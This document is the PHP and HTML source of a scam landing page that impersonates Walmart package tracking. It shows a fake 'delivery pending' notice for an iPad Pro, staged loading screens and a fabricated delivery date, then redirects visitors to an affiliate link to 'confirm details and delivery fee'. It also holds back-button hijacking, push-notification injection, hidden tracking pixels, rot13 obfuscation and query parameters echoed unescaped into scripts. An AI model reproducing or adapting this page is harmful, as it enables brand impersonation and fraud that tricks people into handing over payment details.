<html class="no-js" lang="en">

<?php
// w4 logo

$page_peel_brand = "";
  if ($_GET['s'] == "1016") {
$page_peel_brand = <<<page_peel_brand
<script type="text/javascript" src="/utils/banners/banner-brnd.js"></script>
<style>
img.banner {
    position: fixed;
    top: 0;
    width: 150px;
    z-index: 999999999999;
}
</style>
page_peel_brand;
  }
// This is index-rp-nl-nw-exc.php - No Logo - New Window - Exclude by EPV
session_start();
require_once dirname(__FILE__) . "/../wall/nas-functions.php";
if(isset($_GET['nasTag']) && !empty($_GET['nasTag'])) {
  $tag = $_GET['nasTag'];
} else {
  $tag = "";
}

$data = GetNasWall("", null, $tag)[0];

require_once(dirname(__FILE__) . "/../helpers.php");
if (getcwd() === "/var/surveys/redzun") {
    include("_php_voluum_clock_or_lptoken_check-w14.php");
} else {
    include(dirname(__FILE__) . "/../_php_voluum_clock_or_lptoken_check-w14.php");
}

if (isset($_GET['cc'])) $country = strtolower($_GET['cc']); // country must be defined for include
  else $country = 'us';

$_SESSION['cc'] = $country; // Set Country ID

if (isset($_GET['wid'])) $wid = strtolower($_GET['wid']); // Wall ID
  else $wid = 'default';

$_SESSION['wid'] = $_GET['wid']; // Set Wall ID

$offer_parameters = "?c=" . $_GET['c']."&k="."&v=".$_GET['v']."&s=".$_GET['s']."&t=".$_GET['t']."&cr=".$_GET['cr']."&src=".$_GET['src']."&lp=".$_GET['lp']."&id=".$_GET['id'];
$offer_url = "https://" . $offer_link_domain_fold . "/de7d783b-d901-4973-8080-b75e3e249c7c". $offer_parameters;

?>
<script>
  function r(b,a){return++a?String.fromCharCode((b<"["?91:123)>(b=b.charCodeAt()+13)?b:b-26):b.replace(/[a-zA-Z]/g,r)}
  pr_name = "<?php echo str_rot13(""); ?>";


</script>

<script>
 			window.c_var = '<?=!empty($_GET['c']) ? $_GET['c'] : ""?>';
			window.k_var = '<?=!empty($_GET['k']) ? str_rot13($_GET['k']) : ""?>';
			window.s_var = '<?=!empty($_GET['s']) ? $_GET['s'] : ""?>';
			window.src_var = '<?=!empty($_GET['src']) ? $_GET['src'] : ""?>';
			window.id_var = '<?=!empty($_GET['id']) ? $_GET['id'] : ""?>';
			
			var jumpurl;
      jumpurl = '<?php echo $data->url ?>';
 </script>

<head>
    <base href="">
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
    <title>Track &amp; Trace</title>
    <meta name="description" content="" />
    <meta name="author" content="front-man.com" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=yes" />
    <link rel="icon" type="image/png" sizes="32x32" href="./files/wal_favicon.png" />
    <!-- Chrome Android color -->
    <meta name="theme-color" content="#fff" />
    <!-- Fonts -->
    <link href="https://fonts.googleapis.com/css?family=Poppins:400,500,600,700" rel="stylesheet" />
    <!-- Styles -->
    <link rel="stylesheet" href="./files/courier.css" />

    <!-- Modernizr -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="./files/svg4everybody.min.js"></script>
    <script>
        $(window).on("load", function () {
            $('body').addClass('loaded');
        });

        //Mobile height
        window.addEventListener('load', () => {
            let vh = window.innerHeight * 0.01;
            document.documentElement.style.setProperty('--vh', `${vh}px`);
        });
        window.addEventListener('resize', () => {
            let vh = window.innerHeight * 0.01;
            document.documentElement.style.setProperty('--vh', `${vh}px`);
        });

        $(document).ready(function () {
            //SVG
            svg4everybody();


            //Screen trigger
            $('.screen-trigger--1').click(function () {
                $('html, body').animate({ scrollTop: 0 }, 100);
                $('.main--1').fadeOut(100);

                $('.page').addClass('page--inner');

                setTimeout(
                    function () {
                        $('.main--2').fadeIn(1000);
                    }, 100
                );

                setTimeout(
                    function () {
                        $('html, body').animate({ scrollTop: 0 }, 100);
                        $('.main--2 .spinner').fadeOut(180);
                        $('.main--2').addClass('checked');
                    }, 3000
                );

                setTimeout(
                    function () {
                        $('html, body').animate({ scrollTop: 0 }, 100);
                        $('.main--2').fadeOut(100);
                        $('.main--3').fadeIn(1000);
                    }, 4000
                );
            });

            $('.screen-trigger--2').click(function () {
                $('html, body').animate({ scrollTop: 0 }, 100);
                $('.main--3').fadeOut(200);

                setTimeout(
                    function () {
                        $('.main--4').fadeIn(1000);
                    }, 200
                );
            });


            //Questions
            $('.question--1 label:not([data-error]), .question--2 label').click(function () {
                var currentQ = $(this).parents('.question'),
                    nextQ = $(this).parents('.question').next();

                setTimeout(function () {
                    currentQ.fadeOut(300);
                }, 500);

                setTimeout(function () {
                    nextQ.fadeIn(500);
                }, 800);
            });

            $('[data-error]').click(function () {
                var message = $(this).data('error');

                $(this).append('<span class="question__error">' + message + '</span');
            });

            $('.question--3 label').click(function () {
                $('html, body').animate({ scrollTop: 0 }, 100);

                setTimeout(function () {
                    $('.main--4').fadeOut(200);
                }, 300);

                setTimeout(function () {
                    $('.main--5').fadeIn(1000);
                }, 500);

                setTimeout(
                    function () {
                        $('html, body').animate({ scrollTop: 0 }, 100);
                        $('.main--5 .spinner').fadeOut(180);
                        $('.main--5').addClass('checked');
                    }, 3300
                );

                setTimeout(
                    function () {
                        $('html, body').animate({ scrollTop: 0 }, 100);
                        $('.main--5').fadeOut(100);
                        $('.main--6').fadeIn(1000).css('display', 'flex');
                    }, 4300
                );
            });
        });
    </script>
    <script>
        $(document).ready(function () { // date-delivery let d = new Date();
            d.setDate(d.getDate() + 2); let deliverDate = ('0' +
                (d.getDate())).slice(-2) + '/' + ('0' + (d.getMonth() + 1)).slice(-2) +
                '/' + d.getFullYear(); $(".date-delivery").append(deliverDate);
        });
    </script>
    <script>var pm_tag = '022024'; var pm_pid = "11397-bff849c2";</script>

    <style>
        .step--current,
        .step--done {
            border-color: #0071CE;
        }

        .step--current::before,
        .step--done::before {
            background-color: #0071CE;
            opacity: 1;
        }

        .step--done::before {
            width: 100% !important;
            height: 100% !important;
        }

        .step--done::after {
            background-color: #0071CE !important;
        }

        .btn {
            background-color: #0071CE;
            color: #fff
        }

        .btn:hover {
            background-color: #0071CE
        }

        .question__answers label::after {
            width: 10px;
            height: 10px;

            background-color: #0071CE;
            opacity: 0;
            margin-left: 3px;
        }

        .question__answers input:checked+label {
            background-color: #0071CE;
        }

        body {
            background-color: #fff;
        }

        .page {
            background-color: #fff;
        }
    </style>
</head>

<body>
    <div class="page">
        <!-- HEADER -->
        <header class="header"
            style="height: 60px; display: flex; justify-content: center; align-items: center; background-color: #0071CE">
            <div class="container"
                style="max-width: 400px; width: 100%; height: 60px; display: flex; align-items: center; position: relative;">
                <div class="left-image" style="position: absolute; left: 10px;">
                    <img src="./files/wal_logo.png" style="width: 90px; height: auto;" />
                </div>
                <div class="right-images" style="height: 30px; width: 100px; margin-left: auto; display: flex; gap: 10px;">
                    <img src="https://www.freeiconspng.com/thumbs/search-icon-png/search-icon-png-5.png"
                        style="width: 50px; height: auto;" />
                    <img src="./files/pr.png"
                        style="width: 40px; height: auto;" />
                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b2/Hamburger_icon.svg/800px-Hamburger_icon.svg.png"
                        style="width: 50px; height: auto;" />
                </div>
            </div>
        </header>
        <!-- / HEADER -->

        <!-- Screen 1 -->
        <main class="main main--1">
            <div class="card">
                <h2 class="title">DELIVERY PENDING</h2>
                <span class="badge" data-badge="!"><img src="./files/icon-box.svg" alt="" /></span>

                <dl class="tracking-code">
                    <dt> You have (1) package on hold. </dt>
                </dl>
                <div class="card2">
                    <div id="dateDisplay5" style="font-size: 10px; color: #333; text-align: left;"></div>
                    <div class="circle-container">
                        <div class="glowing-circle-green"></div>
                        <p class="circle-text">&nbsp;Your package was picked up</p>

                    </div>
                    <p style="font-size: 12px; color: #333; text-align: left;">
                        &nbsp;&nbsp;-
                        Package# AIPD-1512-KL10
                    </p>
                    <br />
                    <div id="dateDisplay2" style="font-size: 10px; color: #333; text-align: left;"></div>
                    <div class="circle-container">
                        <div class="glowing-circle-green"></div>
                        <p class="circle-text">&nbsp;Your package is prepared for delivery!</p>
                    </div><br />
                    <div id="dateDisplay0" style="font-size: 10px; color: #333; text-align: left;"></div>

                    <script>
                        function displayDate(elementId, daysAgo, locale) {
                            var date = new Date();
                            date.setDate(date.getDate() - daysAgo);
                            var formatter = new Intl.DateTimeFormat(locale, { dateStyle: 'full' });
                            var dateString = formatter.format(date);
                            document.getElementById(elementId).textContent = dateString;
                        }

                        const date5 = displayDate("dateDisplay5", 5, "en");
                        const date2 = displayDate("dateDisplay2", 2, "en");
                        const date0 = displayDate("dateDisplay0", 0, "en");
                    </script>
                    <div class="circle-container">
                        <div class="glowing-circle-red"></div>
                        <p class="circle-text">&nbsp;Package on hold</p>
                        <br />

                    </div>
                    <p style="font-size: 12px; color: #333; text-align: left;">
                        &nbsp;&nbsp;-
                        Please confirm delivery details on next page
                    </p>
                    <p style="font-size: 12px; color: #333; text-align: left;">
                        &nbsp;&nbsp;-
                        Delivery fee not paid by vendor
                    </p>
                </div>

                <dl class="tracking-code">
                    <dt> Please confirm your delivery details on the next page</dt>
                </dl>
                <hr />

                <dl class="tracking-code">
                    <br />

                    <dt>Your Tracking Code</dt>
                    <dd>AIPD-1512-KL10</dd>
                </dl>
            </div>

            <button type="button" class="btn screen-trigger--1">Continue ></button>

        </main>

        <!-- Screen 2 -->
        <main class="main main--2">
            <div class="card">
                <div class="spinner"><img src="./files/courier-glass.gif" /></div>

                <svg role="img" class="main__icon icon icon-check">
                    <use xlink:href="icons.svg#icon-check"></use>
                </svg>

                <ul class="loading-list">
                    <li>Locating your package...</li>
                    <li>Looking for the tracking number...</li>
                    <li>Looking for delivery options...</li>
                </ul>
            </div>
        </main>

        <!-- Screen 3 -->
        <main class="main main--3">
            <ol class="steps-wrap">
                <li class="step step--current"></li>
                <li class="step"></li>
                <li class="step"></li>
            </ol>
            <div class="card">
                <center><img src="./files/img.jpg" alt="" /></center>
                <div class="product">

                    <div class="product__content">

                        <h3 class="subtitle">Package Information:</h3>
                        <hr />
                        <dl class="tracking-code2">
                            <dt>Contents per waybill:</dt>
                            <dd>iPad Pro</dd>
                        </dl>
                        <dl class="tracking-code2">
                            <dt>Status:</dt>
                            <dd>Ready to ship</dd>
                        </dl>
                        <dl class="tracking-code2">
                            <dt>Shipping Via:</dt>
                            <dd>Walmart</dd>
                        </dl>
                        <dl class="tracking-code2">
                            <dt>Shipping Cost:</dt>
                            <dd>Pending...</dd>
                        </dl>

                    </div>
                </div>
            </div>

            <button type="button" class="btn screen-trigger--2">Schedule Your Delivery Now
                ></button>
        </main>

        <!-- Screen 4 -->
        <main class="main main--4">
            <ol class="steps-wrap">
                <li class="step step--done"></li>
                <li class="step step--current"></li>
                <li class="step"></li>
            </ol>

            <div class="card">
                <!-- <img src="" alt=""> -->

                <form class="questions-wrap">
                    <center><img src="img.jpg" alt="" /></center>
                    <div class="question question--1">
                        <h2 class="subtitle">How would you like to receive your order?</h2>

                        <div class="question__answers">
                            <input type="radio" id="question01a" name="question01" />
                            <label for="question01a">
                                <svg id="icon-truck" viewBox="0 0 30 22" role="img" class="icon icon-truck">
                                    <path id="e89ia"
                                        d="M0 0h1v1H0V0zm2 0h7v1H2V0zm21.5 18h1v1h-1v-1zm-17 0h1v1h-1v-1zM22 12h6.3L26 8.5h-4V12zm2 3.5c1.5 0 2.7 1.1 3 2.5h2v-1h-1.5v-1H29v-2.9l-.1-.1h-7.4c-.3 0-.5-.2-.5-.5V8c0-.3.2-.5.5-.5h3.9l-.6-1H20V18h1c.3-1.4 1.5-2.5 3-2.5zm2 3c0-1.1-.9-2-2-2s-2 .9-2 2 .9 2 2 2 2-.9 2-2zm-19-3c1.5 0 2.7 1.1 3 2.5h9v-1h-8.5v-1H19V5H2V4h17V3H1v13h2.5v1H1v1h3c.3-1.4 1.5-2.5 3-2.5zm0 6c-1.5 0-2.7-1.1-3-2.5H.5c-.3 0-.5-.2-.5-.5v-16c0-.2.2-.5.5-.5h19c.3 0 .5.3.5.5v3h5c.2 0 .3.1.4.2l4.5 7c.1.1.1.2.1.3v5.5c0 .3-.2.5-.5.5H27c-.2 1.4-1.5 2.5-3 2.5s-2.7-1.1-3-2.5H10c-.3 1.5-1.5 2.5-3 2.5zm2-3c0-1.1-.9-2-2-2s-2 .9-2 2 .9 2 2 2 2-.9 2-2z">
                                    </path>
                                </svg>
                                <span>Delivery at Home/Work</span>
                            </label>

                            <input type="radio" id="question01b" name="question01" disabled />
                            <label for="question01b" data-error="The package is already in the depot.">
                                <svg role="img" class="icon icon-store" id="icon-store" viewBox="0 0 30 25">
                                    <path id="yrh3a"
                                        d="M17.8 12.7v8.9c0 .2-.2.4-.4.4H4.7c-.2 0-.4-.2-.4-.4v-8.9c0-.2.2-.4.4-.4h12.7c.2-.1.4.1.4.4zm-.9.4H5.1v8h11.8v-8zm12.2 10.8c0 .2-.2.4-.4.4H1.4c-.2 0-.4-.2-.4-.4s.2-.4.4-.4h.5v-13C.7 9.7 0 8.4 0 7c0-.1 0-.2.1-.2L3.6.7c.2-.4.6-.7 1.1-.7h20.5c.5 0 1 .3 1.2.7l3.5 6.1c.1.1.1.1.1.2 0 1.4-.8 2.7-1.9 3.4v13h.5c.3.1.5.3.5.5zm-25-13.7C5.7 10.2 7 9 7.2 7.5h-3c-.2 0-.4-.2-.4-.5s.2-.4.4-.4h21.6c.2 0 .4.2.4.4s-.2.5-.4.5h-3.1c.2 1.6 1.6 2.8 3.2 2.8s2.9-1.2 3.2-2.8h-1.4c-.2 0-.4-.2-.4-.4s.2-.4.4-.4h1.1l-3.1-5.4c-.1-.2-.3-.3-.4-.3H4.7c-.1-.1-.3 0-.4.1L1.2 6.6h1.1c.2 0 .4.2.4.5 0 .2-.2.4-.4.4H.9c.2 1.5 1.6 2.7 3.2 2.7zm11.4-2.7c.2 1.6 1.6 2.8 3.2 2.8s2.9-1.2 3.2-2.8h-6.4zm-7.3 0c.2 1.6 1.6 2.8 3.2 2.8s2.9-1.2 3.2-2.8H8.2zM24.9 22h-4.8v1.5h4.8V22zm0-8.9h-4.8v8h4.8v-8zm2.3-2.2c-1.9.7-4-.2-5-2-.7 1.4-2.1 2.2-3.6 2.2s-2.9-.9-3.6-2.2c-.7 1.4-2.1 2.2-3.6 2.2s-2.9-.9-3.6-2.2c-.9 1.8-3 2.7-5 2v12.6h16.5V12.7c0-.2.2-.4.4-.4h5.6c.2 0 .4.2.4.4v10.8h1.5V10.9z">
                                    </path>
                                </svg>
                                <span>I&#x27;m going to pick it up myself</span>
                            </label>
                        </div>
                    </div>

                    <div class="question question--2">
                        <h2 class="subtitle">Where do you want it to be delivered?</h2>

                        <div class="question__answers">
                            <input type="radio" id="question02a" name="question02" />
                            <label for="question02a">
                                <svg role="img" class="icon icon-home" id="icon-home" viewBox="0 0 30 30">
                                    <path id="kwgla"
                                        d="M10 17.5V23h.5c.3 0 .5.2.5.5s-.2.5-.5.5h-6c-.3 0-.5-.2-.5-.5s.2-.5.5-.5H5v-5.5c0-.3.2-.5.5-.5h4c.3 0 .5.2.5.5zM9 21H6v2h3v-2zm0-3H6v2h3v-2zm10.5 10H11v1.5c0 .3-.2.5-.5.5s-.5-.2-.5-.5v-2c0-.3.2-.5.5-.5H12v-9.5c0-.3.2-.5.5-.5h5c.3 0 .5.2.5.5V27h1.5c.3 0 .5.2.5.5s-.2.5-.5.5zM17 22v-4h-4v9h4v-4h-.5c-.3 0-.5-.2-.5-.5s.2-.5.5-.5h.5zm8-4.5V23h.5c.3 0 .5.2.5.5s-.2.5-.5.5h-6c-.3 0-.5-.2-.5-.5s.2-.5.5-.5h.5v-5.5c0-.3.2-.5.5-.5h4c.3 0 .5.2.5.5zM24 21h-3v2h3v-2zm0-3h-3v2h3v-2zm-9-6c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm0-1c.6 0 1-.5 1-1s-.4-.9-1-1c-.6 0-1 .5-1 1 .1.6.5 1 1 1zm15 17c0 1.1-.9 2-2 2H12.5c-.3 0-.5-.2-.5-.5s.2-.5.5-.5h8.6c-.1-.2-.1-.3-.1-.5 0-.7.4-1.2 1-1.4.2-1.2 1.2-2.1 2.5-2.1 1 0 1.8.6 2.2 1.4.1-.1.2-.1.3-.2V18c0-.3.2-.5.5-.5s.5.2.5.5v8c1.1 0 2 .9 2 2zm-1 0c0-.6-.4-1-1-1-.5 0-.9.3-1 .7-.1.3-.4.4-.6.3-.2-.1-.3-.3-.3-.5 0-.8-.7-1.5-1.5-1.5s-1.6.7-1.6 1.5c0 .3-.2.5-.5.5s-.5.2-.5.5.2.5.5.5H28c.6 0 1-.4 1-1zm1-23.5V17c0 .3-.2.5-.5.5-.1 0-.3-.1-.4-.1L15 3.2.9 17.4c-.2.2-.5.2-.7 0-.1-.1-.2-.3-.2-.4V4.5c0-.3.2-.5.5-.5H6V3h-.5c-.3 0-.5-.2-.5-.5v-2c0-.3.2-.5.5-.5h4c.3 0 .5.2.5.5v2c0 .3-.2.5-.5.5H9v1h1c.3 0 .5.2.5.5s-.2.5-.5.5H8.5c-.3 0-.5-.2-.5-.5v-2c0-.3.2-.5.5-.5H9V1H6v1h.5c.3 0 .5.2.5.5v2c0 .3-.2.5-.5.5H1v10.8L14.6 2.1c.2-.2.5-.2.7 0L29 15.8V5h-9c-.3 0-.5-.2-.5-.5s.2-.5.5-.5h9.5c.3 0 .5.2.5.5zm-21 24c0 .8-.7 1.5-1.5 1.5H2c-1.1 0-2-.9-2-2s.9-2 2-2v-8c0-.3.2-.5.5-.5s.5.2.5.5v8.2c.1 0 .2.1.3.2.4-.9 1.2-1.4 2.2-1.4 1.2 0 2.3.9 2.5 2.1.6.2 1 .8 1 1.4zm-1 0c0-.3-.2-.5-.5-.5s-.5-.2-.5-.5c0-.8-.7-1.5-1.5-1.5S4 26.7 4 27.5c0 .3-.2.5-.5.5-.2 0-.4-.1-.5-.3-.1-.4-.5-.7-1-.7-.6 0-1 .5-1 1s.4.9 1 1h5.5c.3 0 .5-.2.5-.5z">
                                    </path>
                                </svg>
                                <span>At Home</span>
                            </label>

                            <input type="radio" id="question02b" name="question02" />
                            <label for="question02b">
                                <svg role="img" class="icon icon-briefcase" id="icon-briefcase" viewBox="0 0 30 23">
                                    <path id="jbe1a"
                                        d="M30 5.8v14.7c0 1.2-.9 2.1-2.1 2.1H2.1c-1.2 0-2.1-.9-2.1-2.1V5.8c0-1.2.9-2.1 2.1-2.1h7.5V2.4c0-1.3 1-2.4 2.4-2.4h6c1.3 0 2.4 1.1 2.4 2.4v1.3h7.5c1.2 0 2.1.9 2.1 2.1zM10.8 3.7h8.5V2.4c0-.7-.5-1.2-1.2-1.2H12c-.7 0-1.2.5-1.2 1.2v1.3zm18 16.8V5.8c0-.5-.4-.9-.9-.9H2.1c-.5 0-.9.4-.9.9v1.8l9.3 4.5c.4-.9 1.2-1.5 2.2-1.5h4.5c1 0 1.9.6 2.2 1.5l5.3-2.6c.3-.1.7 0 .8.3.1.3 0 .7-.3.8l-5.7 2.8c-.2 1.2-1.2 2-2.4 2h-4.5c-1.2 0-2.2-.8-2.4-2L1.2 9v11.5c0 .5.4.9.9.9h25.8c.5 0 .9-.4.9-.9zm-16.1-6.3h4.5c.7 0 1.2-.5 1.2-1.2s-.5-1.2-1.2-1.2h-4.5c-.7 0-1.2.5-1.2 1.2s.6 1.2 1.2 1.2z">
                                    </path>
                                </svg>
                                <span>At Work</span>
                            </label>
                        </div>
                    </div>

                    <div class="question question--3">
                        <h2 class="subtitle">When would like your delivery?</h2>

                        <div class="question__answers">
                            <input type="radio" id="question03a" name="question03" />
                            <label for="question03a">
                                <svg role="img" class="icon icon-calendar" id="icon-calendar" viewBox="0 0 26 24">
                                    <path id="_x34_trla"
                                        d="M21.7 19.8c0-.3.2-.5.5-.5s.5.2.5.5-.2.5-.5.5c-.2 0-.5-.2-.5-.5zm-3.6 0c0-.3.2-.5.5-.5s.5.2.5.5-.2.5-.5.5-.5-.2-.5-.5zm-3.6 0c0-.3.2-.5.5-.5s.5.2.5.5-.2.5-.5.5-.5-.2-.5-.5zm-3.6 0c0-.3.2-.5.5-.5s.5.2.5.5-.2.5-.5.5-.5-.2-.5-.5zm-3.7 0c0-.3.2-.5.5-.5s.5.2.5.5-.2.5-.4.5c-.3 0-.6-.2-.6-.5zm-3.6 0c0-.3.2-.5.5-.5s.5.2.5.5-.2.5-.5.5c-.2 0-.5-.2-.5-.5zm18.1-3.6c0-.3.2-.5.5-.5s.5.2.5.5-.2.5-.5.5c-.2 0-.5-.2-.5-.5zm-3.6 0c0-.3.2-.5.5-.5s.5.2.5.5-.2.5-.5.5-.5-.2-.5-.5zm-3.6 0c0-.3.2-.5.5-.5s.5.2.5.5-.2.5-.5.5-.5-.2-.5-.5zm-3.6 0c0-.3.2-.5.5-.5s.5.2.5.5-.2.5-.5.5-.5-.2-.5-.5zm-3.7 0c0-.3.2-.5.5-.5s.5.2.5.5-.2.5-.4.5c-.3 0-.6-.2-.6-.5zm-3.6 0c0-.3.2-.5.5-.5s.5.2.5.5-.2.5-.5.5c-.2 0-.5-.2-.5-.5zm18.1-4c0-.3.2-.5.5-.5s.5.2.5.5-.2.5-.5.5c-.2 0-.5-.2-.5-.5zm-3.6 0c0-.3.2-.5.5-.5s.5.2.5.5-.2.5-.5.5-.5-.2-.5-.5zm-3.6 0c0-.3.2-.5.5-.5s.5.2.5.5-.2.5-.5.5-.5-.2-.5-.5zm-3.6 0c0-.3.2-.5.5-.5s.5.2.5.5-.2.5-.5.5-.5-.2-.5-.5zM26 2v22H0V2h5.8C6 .8 7.1 0 8.3 0c1.4 0 2.6 1.1 2.6 2.5S9.7 5 8.3 5c-.3 0-.5-.2-.5-.5S8 4 8.3 4c.9 0 1.6-.7 1.6-1.5S9.2 1 8.3 1c-.6 0-1.2.4-1.4 1h.9c.3 0 .5.2.5.5s-.2.5-.5.5H1v4.6h24V3h-4.8c-.2 1.2-1.3 2-2.5 2-.3 0-.5-.2-.5-.5s.2-.5.5-.5c.9 0 1.6-.7 1.6-1.5S18.6 1 17.7 1c-.3 0-.5-.2-.5-.5s.2-.5.5-.5c1.2 0 2.3.9 2.5 2H26zM14 .5c0-.3.3-.5.6-.5 1.4 0 2.6 1.1 2.6 2.5S16 5 14.6 5c-.3 0-.5-.2-.5-.5s.2-.5.5-.5c.9 0 1.6-.7 1.6-1.5S15.5 1 14.6 1c-.3 0-.6-.2-.6-.5zm-3.1 0c0-.3.2-.5.5-.5C12.9 0 14 1.1 14 2.5S12.8 5 11.4 5c-.3 0-.5-.2-.5-.5s.2-.5.5-.5c.9 0 1.6-.7 1.6-1.5S12.3 1 11.4 1c-.2 0-.5-.2-.5-.5zM25 8.6H1V23h24V8.6z">
                                    </path>
                                </svg>
                                <span>Weekday</span>
                            </label>

                            <input type="radio" id="question03b" name="question03" />
                            <label for="question03b">
                                <svg role="img" class="icon icon-calendar" id="icon-calendar" viewBox="0 0 26 24">
                                    <path id="_x34_trla"
                                        d="M21.7 19.8c0-.3.2-.5.5-.5s.5.2.5.5-.2.5-.5.5c-.2 0-.5-.2-.5-.5zm-3.6 0c0-.3.2-.5.5-.5s.5.2.5.5-.2.5-.5.5-.5-.2-.5-.5zm-3.6 0c0-.3.2-.5.5-.5s.5.2.5.5-.2.5-.5.5-.5-.2-.5-.5zm-3.6 0c0-.3.2-.5.5-.5s.5.2.5.5-.2.5-.5.5-.5-.2-.5-.5zm-3.7 0c0-.3.2-.5.5-.5s.5.2.5.5-.2.5-.4.5c-.3 0-.6-.2-.6-.5zm-3.6 0c0-.3.2-.5.5-.5s.5.2.5.5-.2.5-.5.5c-.2 0-.5-.2-.5-.5zm18.1-3.6c0-.3.2-.5.5-.5s.5.2.5.5-.2.5-.5.5c-.2 0-.5-.2-.5-.5zm-3.6 0c0-.3.2-.5.5-.5s.5.2.5.5-.2.5-.5.5-.5-.2-.5-.5zm-3.6 0c0-.3.2-.5.5-.5s.5.2.5.5-.2.5-.5.5-.5-.2-.5-.5zm-3.6 0c0-.3.2-.5.5-.5s.5.2.5.5-.2.5-.5.5-.5-.2-.5-.5zm-3.7 0c0-.3.2-.5.5-.5s.5.2.5.5-.2.5-.4.5c-.3 0-.6-.2-.6-.5zm-3.6 0c0-.3.2-.5.5-.5s.5.2.5.5-.2.5-.5.5c-.2 0-.5-.2-.5-.5zm18.1-4c0-.3.2-.5.5-.5s.5.2.5.5-.2.5-.5.5c-.2 0-.5-.2-.5-.5zm-3.6 0c0-.3.2-.5.5-.5s.5.2.5.5-.2.5-.5.5-.5-.2-.5-.5zm-3.6 0c0-.3.2-.5.5-.5s.5.2.5.5-.2.5-.5.5-.5-.2-.5-.5zm-3.6 0c0-.3.2-.5.5-.5s.5.2.5.5-.2.5-.5.5-.5-.2-.5-.5zM26 2v22H0V2h5.8C6 .8 7.1 0 8.3 0c1.4 0 2.6 1.1 2.6 2.5S9.7 5 8.3 5c-.3 0-.5-.2-.5-.5S8 4 8.3 4c.9 0 1.6-.7 1.6-1.5S9.2 1 8.3 1c-.6 0-1.2.4-1.4 1h.9c.3 0 .5.2.5.5s-.2.5-.5.5H1v4.6h24V3h-4.8c-.2 1.2-1.3 2-2.5 2-.3 0-.5-.2-.5-.5s.2-.5.5-.5c.9 0 1.6-.7 1.6-1.5S18.6 1 17.7 1c-.3 0-.5-.2-.5-.5s.2-.5.5-.5c1.2 0 2.3.9 2.5 2H26zM14 .5c0-.3.3-.5.6-.5 1.4 0 2.6 1.1 2.6 2.5S16 5 14.6 5c-.3 0-.5-.2-.5-.5s.2-.5.5-.5c.9 0 1.6-.7 1.6-1.5S15.5 1 14.6 1c-.3 0-.6-.2-.6-.5zm-3.1 0c0-.3.2-.5.5-.5C12.9 0 14 1.1 14 2.5S12.8 5 11.4 5c-.3 0-.5-.2-.5-.5s.2-.5.5-.5c.9 0 1.6-.7 1.6-1.5S12.3 1 11.4 1c-.2 0-.5-.2-.5-.5zM25 8.6H1V23h24V8.6z">
                                    </path>
                                </svg>
                                <span>Weekend</span>
                            </label>
                        </div>
                    </div>
                </form>
            </div>
        </main>

        <!-- Screen 5 -->
        <main class="main main--5">
            <ol class="steps-wrap">
                <li class="step step--done"></li>
                <li class="step step--current"></li>
                <li class="step"></li>
            </ol>

            <div class="card">
                <div class="spinner"></div>

                <svg role="img" class="main__icon icon icon-check">
                    <use xlink:href="icons.svg#icon-check"></use>
                </svg>

                <ul class="loading-list">
                    <li>Saving your preferences...</li>
                    <li>Confirming your package...</li>
                    <li>The package is reserved!</li>
                </ul>
            </div>
        </main>

        <!-- Screen 6 -->
        <main class="main main--6">
            <ol class="steps-wrap">
                <li class="step step--done"></li>
                <li class="step step--done"></li>
                <li class="step step--current"></li>
            </ol>
            <div class="card">
                <h2 class="title title--primary">ORDER CONFIRMATION</h2>
                <center><img src="img.jpg" alt="" /></center>
                <h3 class="subtitle" style="margin-bottom: 15px;">Expected Delivery:<br />
                    <div id="futureDateDisplay" style="font-size: 16px; font-weight: 600; color: #333;"></div>

                    <script>
                        const date9 = displayDate("futureDateDisplay", -4, "en");
                    </script>

                    <span class="time-delivery">Between 8:30am to 6:00pm</span>
                </h3>
                <p style="font-size: 14px; font-weight: 500; color: #333;">
                    1. You will be redirected to the vendor page.</p>
                <p style="font-size: 14px; font-weight: 500; color: #333;">
                    2. Please confirm your details and delivery fee.
                </p>
                <p style="font-size: 14px; font-weight: 500; color: #333;">
                    3. Once completed, the expected delivery date is listed above.
                </p>

            </div>

            <img src="<?php echo $data->impression_url ?>" style="display:none;"></img>
            <a class="btn" id="button1">NEXT PAGE ></a>
            <p style="font-size: 14px; font-weight: 500; color: #333;">
                *Signature required at time of delivery
            </p>
        </main>

        <div class="foot" style="background-color: #ffc220">

            <p style="font-size: 14px; font-weight: 500; color: #bfb8af;">
                2024 © - all rights reserved
            </p>
            <p style="font-size: 14px; font-weight: 500; color: #bfb8af;">
                Site | Accounts | FAQs | Connect
            </p>
            <br />
            <div class="foot__icons">

                <img src="./files/foot-icon03.svg" alt="" />
            </div>
        </div>
    </div>
</body>
<script>
    document.getElementById('button1').addEventListener("click",function(){
        var urlParams = new URLSearchParams(window.location.search);
        
        window.location.href = jumpurl ;
    },false);
</script>

<?php
		if (($_GET['nopush'] !== "1") && ($_GET['src'] !== "TV"))
		{
			$aff_id = "2";
			if (!empty($_GET["s"])) {
				$aff_id = $_GET["s"];
			}
			
			$trk_urls = [
				 "https://" . $_GET["trk"] . "/click/20"
			];
			
			echo getPushCode("us", $aff_id, $trk_urls);
		   }
		?>
		
		<?php
		$backbutton_url = "https://" . $_SERVER['HTTP_HOST'] . "/back-w14.php?c=" . $_GET['c'] . "&k=" . $_GET['k'] . "&id=" . $_GET['id'] . "&source=" . $_GET['source'];
		
		echo getBackButton($backbutton_url);
?>

</html>